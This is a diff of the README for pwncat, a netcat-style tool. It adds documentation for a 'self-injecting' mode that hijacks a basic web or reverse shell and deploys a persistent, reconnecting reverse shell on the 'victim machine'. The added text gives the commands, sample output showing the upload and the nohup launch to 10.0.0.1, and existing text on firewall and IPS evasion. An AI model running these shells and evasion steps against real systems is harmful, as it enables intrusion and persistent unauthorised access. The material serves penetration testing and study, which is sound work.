@@ -25,7 +25,7 @@
 
 
 > &nbsp;
-> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).
+> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).
 > &nbsp;
 
 | :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.55%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.07%)</strong></sup><br/>
 > <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
 
 
@@ -169,6 +169,16 @@ curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
 echo "<BASE64 STRING>" | base64 -d > pwncat
 chmod +x pwncat
 ```
+
+### Inject to target
+```bash
+# [1] If you found a vulnerability on the target to start a very simple reverse shell,
+# such as via bash, php, perl, python, nc or similar, you can instruct your local
+# pwncat listener to use this connection to deploy itself on the target automatically
+# and start an additional unbreakable reverse shell back to you.
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
+```
+> <sup>[1] [Read in more detail about self-injection](#self-injecting-reverse-shell)
 
 ### Summon shells
 ```bash
@@ -218,20 +228,21 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 
 | Feature        | Description |
 |----------------|-------------|
-| [PSE](pse)     | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |
-| Bind shell     | Create bind shells |
-| Reverse shell  | Create reverse shells |
-| Port Forward   | Local and remote port forward (Proxy server/client) |
+| [PSE](pse)        | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |
+| Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |
+| Bind shell        | Create bind shells |
+| Reverse shell     | Create reverse shells |
+| Port Forward      | Local and remote port forward (Proxy server/client) |
 | <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
-| Detect Egress  | Scan and report open egress ports on the target (port hopping) |
-| Evade FW       | Evade egress firewalls by round-robin outgoing ports (port hopping) |
-| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |
-| UDP rev shell  | Try this with the traditional `netcat` |
-| TCP / UDP      | Full TCP and UDP support |
-| Python 2+3     | Works with Python 2, Python 3, pypy2 and pypy3 |
-| Cross OS       | Work on Linux, MacOS and Windows as long as Python is available |
-| Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |
-| Portable       | Single file which only uses core packages - no external dependencies required. |
+| Detect Egress     | Scan and report open egress ports on the target (port hopping) |
+| Evade FW          | Evade egress firewalls by round-robin outgoing ports (port hopping) |
+| Evade IPS         | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |
+| UDP rev shell     | Try this with the traditional `netcat` |
+| TCP / UDP         | Full TCP and UDP support |
+| Python 2+3        | Works with Python 2, Python 3, pypy2 and pypy3 |
+| Cross OS          | Work on Linux, MacOS and Windows as long as Python is available |
+| Compatability     | Use the traditional `netcat` as a client or server together with `pwncat` |
+| Portable          | Single file which only uses core packages - no external dependencies required. |
 
 
 ### Feature comparison matrix
@@ -239,6 +250,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 |                     | pwncat | netcat | ncat |
 |---------------------|--------|---------|-----|
 | Scripting engine    | Python | :x:     | Lua |
+| Self-injecting      | ✔      | :x:     | :x: |
 | IP ToS              | :x:    | ✔       | :x: |
 | IPv4                | ✔      | ✔       | ✔   |
 | IPv6                | *      | ✔       | ✔   |
@@ -403,6 +415,20 @@ optional arguments:
                         goes to a terminal. If it is piped into a file, color
                         will automatically be disabled. This mode also disables
                         color on Windows by default. (default: auto)
+
+command & control arguments:
+  --self-inject cmd:host:port
+                        Listen mode (TCP only):
+                        If you are about to inject a reverse shell onto the
+                        victim machine (via php, bash, nc, ncat or similar),
+                        start your listening server with this argument.
+                        This will then (as soon as the reverse shell connects)
+                        automatically deploy and background-run an unbreakable
+                        pwncat reverse shell onto the victim machine which then
+                        also connects back to you with specified arguments.
+                        Example: '--self-inject /bin/bash:10.0.0.1:4444'
+                        Note: this is currently an experimental feature and does
+                        not work on Windows remote hosts yet.
 
 advanced arguments:
   --script-send file    All modes (TCP and UDP):
@@ -626,6 +652,69 @@ In other words, the client will keep sending null bytes to the server to constan
 
 pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ```
+
+### Self-injecting reverse shell
+Let's imagine you are able to create a very simple and unstable reverse shell from the target to
+your machine, such as a web shell via a PHP script or similar.
+Knowing, that this will not persist very long or might break due to unstable network connection,
+you could use `pwncat` to hook into this connection and deploy itself unbreakably on the target - fully automated.
+
+All you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`
+switch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:
+
+1. Enumerate Python availability and versions on the target
+2. Dump itself base64 encoded onto the target
+3. Use the target's Python to decode itself.
+4. Use the target's Python to start itself as an unbreakable reverse shell back to you
+
+Once this is done, you can keep using the current connection or simply abandon it and start a new
+listener (yes, you don't need to start the listener before starting the reverse shell) to have
+the new `pwncat` client connect to you. The new listener also doesn't have to be `pwncat`, it can
+also be `netcat` or `ncat`.
+
+The **`--self-inject`** switch:
+```bash
+pwncat -l 4444 --self-inject <cmd>:<host>:<port>
+```
+
+* `<cmd>`: This is the command to start on the target (like `-e`/`--exec`, so you want it to be `cmd.exe` or `/bin/bash`)
+* `<host>`: This is for your local machine, the IP address to where the reverse shell shall connect back to
+* `<port>`: This is for your local machine, the port on which the reverse shell shall connect back to
+
+So imagine your Kali machine is 10.0.0.1. You instruct your webshell that you inject onto a Linux server to connect to you at port `4444`:
+```bash
+# Start this locally, before starting the reverse webshell
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
+```
+You will then see something like this:
+```
+[PWNCAT CnC] Probing for: /bin/python
+[PWNCAT CnC] Probing for: /bin/python2
+[PWNCAT CnC] Probing for: /bin/python2.7
+[PWNCAT CnC] Probing for: /bin/python3
+[PWNCAT CnC] Probing for: /bin/python3.5
+[PWNCAT CnC] Probing for: /bin/python3.6
+[PWNCAT CnC] Probing for: /bin/python3.7
+[PWNCAT CnC] Probing for: /bin/python3.8
+[PWNCAT CnC] Probing for: /usr/bin/python
+[PWNCAT CnC] Potential path: /usr/bin/python
+[PWNCAT CnC] Found valid Python2 version: 2.7.16
+[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us
+[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT
+[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)
+[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn -1 --reconn-wait 1 10.0.0.1 4445 &
+```
+And you are set. You can now start another listener locally at `4445` (again, it will connect back to you endlessly, so it is not required to start the listener first).
+```bash
+# either netcat
+nc -lp 4445
+# or ncat
+ncat -l 4445
+# or pwncat
+pwncat -l 4445
+```
+
 
 ### Logging
 
